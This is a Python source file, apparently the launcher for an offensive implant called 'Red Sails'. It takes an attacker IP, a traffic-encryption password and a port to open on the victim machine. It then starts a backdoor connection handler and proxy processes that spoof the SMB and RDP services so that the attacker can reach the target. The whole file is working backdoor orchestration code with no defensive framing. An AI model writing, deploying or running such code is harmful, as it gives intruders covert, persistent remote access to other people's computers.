import time

from optparse import OptionParser
from multiprocessing import Process, freeze_support

# Red Sails modules
from rsRemote.rsConnections import ConnectionsHandler
from rsRemote.rsProxy import ProxyHandler

# Define services for spoofing connections
SMB_PROXY_MODE = {"PORT": 445, "SERVICE": "smb"}
RDP_PROXY_MODE = {"PORT": 3389, "SERVICE": "rdp"}

def main():
	parser = OptionParser()
	parser.add_option("-p", "--password", action="store", dest="password",
				help="Password used to encrypt/decrypt backdoor traffic",
				type=str, default=None)

	parser.add_option("-a", "--attacker-ip", action="store", dest="attacker_ip",
				help="Allowed IP address for inbound proxy spoofing to target",
				type=str, default=None)

	parser.add_option("-o", "--open-port", action="store", dest="open_port",
				help="Backdoor port to open on victim machine",
				type=int, default=None)

	(options, args) = parser.parse_args()

	if (options.password == None) or (options.attacker_ip == None) or (options.open_port == None):
		parser.print_help()
		return 0

	# Defines acceptable proxy communication address
	CONNECTION_CONFIG = {"attackerIPv4": options.attacker_ip}

	# List containing handles to all the processes we create
	procList = []

	backdoorProc = Process(target=ConnectionsHandler, name="BackDoor", args=(options.open_port, options.password,))
	procList.append(backdoorProc)
	backdoorProc.start()

	rdpSpoofProc = Process(target=ProxyHandler, name="RDP-Spoof", args=(RDP_PROXY_MODE, CONNECTION_CONFIG,))
	procList.append(rdpSpoofProc)
	rdpSpoofProc.start()

	smbSpoofProc = Process(target=ProxyHandler, name="SMB-Spoof", args=(SMB_PROXY_MODE, CONNECTION_CONFIG,))
	procList.append(smbSpoofProc)
	smbSpoofProc.start()

	# Enable for debugging on the command line
	'''
	time.sleep(2)
	exit = "n"
	while exit != "y":
		exit = raw_input("exit(y/n)> ")
		exit = exit[0]

	for proc in procList:
		proc.terminate()
		print "[-] Terminiated process..."
	'''
if __name__ == '__main__':
	freeze_support()
	main()

